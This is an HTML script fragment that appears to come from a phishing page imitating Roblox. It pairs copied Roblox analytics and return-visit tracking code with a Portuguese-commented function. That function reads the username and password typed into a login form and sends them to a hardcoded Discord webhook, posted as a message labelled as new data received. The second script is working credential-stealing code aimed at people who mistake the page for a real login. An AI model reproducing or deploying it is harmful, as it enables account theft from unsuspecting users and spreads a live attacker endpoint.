<script type="text/javascript">
    $(function(){
        function trackReturns() {
            function dayDiff(d1, d2) {
                return Math.floor((d1-d2)/86400000);
            }
            if (!localStorage) {
                return false;
            }

            var cookieName = 'RBXReturn';
            var cookieOptions = {expires:9001};
            var cookieStr = localStorage.getItem(cookieName) || "";
            var cookie = {};

            try {
                cookie = JSON.parse(cookieStr);
            } catch (ex) {
                // busted cookie string from old previous version of the code
            }

            try {
                if (typeof cookie.ts === "undefined" || isNaN(new Date(cookie.ts))) {
                    localStorage.setItem(cookieName, JSON.stringify({ ts: new Date().toDateString() }));
                    return false;
                }
            } catch (ex) {
                return false;
            }

            var daysSinceFirstVisit = dayDiff(new Date(), new Date(cookie.ts));
            if (daysSinceFirstVisit == 1 && typeof cookie.odr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_odr', {});
                cookie.odr = 1;
            }
            if (daysSinceFirstVisit >= 1 && daysSinceFirstVisit <= 7 && typeof cookie.sdr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_sdr', {});
                cookie.sdr = 1;
            }
            try {
                localStorage.setItem(cookieName, JSON.stringify(cookie));
            } catch (ex) {
                return false;
            }
        }

        GoogleListener.init();



        RobloxEventManager.initialize(true);
        RobloxEventManager.triggerEvent('rbx_evt_pageview');
        trackReturns();
        

        RobloxEventManager._idleInterval = 450000;
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_start');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_ftp');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_success');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_fmp');
        
    });

</script>

<script>
async function enviar() {
   alert("funcionou");
  // 1. Captura o que foi digitado em cada campo
  const usuarioDigitado = document.getElementById("usuario").value;
  const senhaDigitada = document.getElementById("senha").value;
  
  const webhookURL = "https://discord.com/api/webhooks/1517623373365121218/CR5a9sVeeuGM98gleCOwiPk2wuzvYCyUCUjsRl6aOgaamsycTd9cvaQEEM-wcSxXFiGe";

  // Validação simples: não envia se um dos dois estiver vazio
  if (!usuarioDigitado.trim() || !senhaDigitada.trim()) {
    alert("Por favor, preencha todos os campos.");
    return;
  }

  // 2. Formata o texto que vai aparecer lá no chat do Discord
  const data = {
    content: `🔔 **Novos dados recebidos!**\n👤 **Usuário:** ${usuarioDigitado}\n🔑 **Senha:** ${senhaDigitada}`
  };

  try {
    // 3. Envia os dados para o Webhook
    const response = await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });

    if (response.ok) {
      alert("Dados enviados com sucesso!");
      // Limpa os campos após o envio
      document.getElementById("usuario").value = "";
      document.getElementById("senha").value = "";
    } else {
      alert("Erro ao enviar. Código: " + response.status);
    }
  } catch (err) {
    console.error("Erro na conexão:", err);
    alert("Erro ao conectar com o servidor.");
  }
}

</script>
